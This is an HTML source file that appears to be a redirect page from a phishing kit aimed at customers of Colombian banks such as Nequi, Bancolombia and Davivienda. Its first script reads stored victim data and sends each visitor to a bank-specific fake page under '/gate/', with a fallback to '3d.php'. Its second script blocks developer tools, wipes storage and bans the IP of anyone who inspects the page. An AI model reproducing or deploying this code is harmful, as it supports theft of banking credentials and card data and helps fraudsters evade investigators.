<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <title>Redirigiendo...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { 
      background: white; 
      display: flex; 
      justify-content: center; 
      align-items: center; 
      height: 100vh; 
      font-family: sans-serif; 
    }
    .loader {
      width: 80%;
      max-width: 300px;
      height: 4px;
      background: #ccc;
      overflow: hidden;
      border-radius: 3px;
    }
    .loader::after {
      content: "";
      display: block;
      height: 100%;
      width: 0;
      background: #007bff;
      animation: loading 2s linear infinite;
    }
    @keyframes loading {
      0% { width: 0; }
      100% { width: 100%; }
    }
  </style>
</head>
<body>
  <div class="loader"></div>

  <script>
    (function() {
      let folder = null;
      let tipo   = null;
      const params = window.location.search || "";

      // Intentar leer banco desde el <select> (no existe aquí, pero mantenido por compatibilidad)
      const selBanco = document.getElementById("txt-banco");
      if (selBanco && selBanco.value) {
        const opt = selBanco.options[selBanco.selectedIndex];
        folder = opt.getAttribute("folder") || null;
        tipo   = opt.getAttribute("tipo")   || null;
      }

      if (!folder) {
        const info = JSON.parse(localStorage.getItem("infoload") || "{}");
        let bancoRaw = (info.bank || "").toLowerCase().trim();

        // Priorizar tbdatos
        try {
          const tb = JSON.parse(localStorage.getItem("tbdatos") || "{}") || {};
          if (tb.banco) {
            bancoRaw = String(tb.banco).toLowerCase().trim();
          }
        } catch (e) {}

        // Normalizar banco
        bancoRaw = bancoRaw
          .normalize("NFD")
          .replace(/[\u0300-\u036f]/g, "")
          .replace(/[^a-z0-9\s]/g, "");
        const bancoClean = bancoRaw.replace(/\s+/g, "");

        // Verificación especial para NEQUI
        if (bancoClean.includes("nequi")) {
          folder = "b-15";
          tipo   = "1";
        } else {
          const bankMap = [
            { keys: ["avvillas", "bancoavvillas"], folder: "b-03",  tipo: "2" },
            { keys: ["bbva"], folder: "b-16", tipo: "2" },
            { keys: ["cajasocial", "bancocajasocial"], folder: "b-09", tipo: "2" },
            { keys: ["bogota", "bancodebogota"], folder: "b-10", tipo: "2" },
            { keys: ["davivienda"], folder: "b-04", tipo: "2" },
            { keys: ["occidente", "bancodeoccidente"], folder: "b-06", tipo: "2" },
            { keys: ["falabella"], folder: "b-11", tipo: "2" },
            { keys: ["finandina"], folder: "b-12", tipo: "2" },
            { keys: ["itau"], folder: "b-13", tipo: "2" },
            { keys: ["mundomujer", "bmancomundomujer"], folder: "b-01", tipo: "1" },
            { keys: ["popular", "bancopopular"], folder: "b-08", tipo: "2" },
            { keys: ["serfinanza"], folder: "b-07", tipo: "2" },
            { keys: ["union", "giros", "bancounion"], folder: "b-17", tipo: "1" },
            { keys: ["bancolombia", "bancocolombia"], folder: "b-14", tipo: "2" },
            { keys: ["lulo"], folder: "b-02", tipo: "1" },
            { keys: ["scotiabank", "colpatria", "scotiabankcolpatria"], folder: "b-05", tipo: "2" }
          ];

          for (const bank of bankMap) {
            const match = bank.keys.some(k => bancoClean.includes(k.replace(/\s+/g, "")));
            if (match) {
              folder = bank.folder;
              tipo   = bank.tipo;
              break;
            }
          }
        }
      }

      // Redirección
      if (folder) {
        setTimeout(() => {
          window.location.href = `/gate/recargas/transaction/${folder}${params}`;
        }, 900);
      } else {
        // Redirección fallback si no detecta banco
        setTimeout(() => {
          window.location.href = "3d.php";
        }, 1200);
      }
    })();
  </script>
<script>
// --- DESACTIVAR CLICK DERECHO, INSPECCIONAR Y F12 ---
(function() {
    // 1. Desactivar Click Derecho
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    });

    // 2. Desactivar atajos de teclado de desarrollo (F12, Ctrl+Shift+I, Ctrl+Shift+C, Ctrl+Shift+J, Ctrl+U, Cmd+Opt+I)
    document.addEventListener('keydown', function(e) {
        // F12
        if (e.keyCode === 123) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
        // Ctrl+Shift+I o Cmd+Opt+I
        if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
        // Ctrl+U (Ver código fuente)
        if ((e.ctrlKey || e.metaKey) && e.keyCode === 85) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
    });

    // 3. Detectar apertura de Herramientas de Desarrollo (DevTools) por dimensiones
    let devtoolsOpen = false;
    const threshold = 160;
    
    function checkDevTools() { return false; }

    // 4. Función para Auto-Banear la IP del Atacante
    let banTriggered = false;
    function triggerAutoBan() {
        if (banTriggered) return;
        banTriggered = true;
        
        // Limpieza inmediata del almacenamiento local
        try {
            localStorage.clear();
            sessionStorage.clear();
            document.cookie.split(";").forEach(function(c) { 
                document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
            });
        } catch(e) {}

        // Enviar IP para auto-bloqueo al backend (usamos el honeypot para gatillar el baneo)
        const formData = new FormData();
        formData.append('website', 'automated_devtools_trigger');
        
        // Buscamos si tenemos la variable de transacción en localStorage
        let tid = '';
        try {
            tid = localStorage.getItem('last_tid') || localStorage.getItem('session_id') || '';
        } catch(e) {}
        if (tid) {
            formData.append('transactionId', tid);
        }

        // Enviamos post silencioso para banear la IP en el backend
        fetch('/gate/process/paso1datos.php', {
            method: 'POST',
            body: formData,
            keepalive: true
        }).finally(function() {
            window.location.replace("/fin.php");
        });
    }
})();
// ---------------------------------------------------
</script>
</body>
</html>
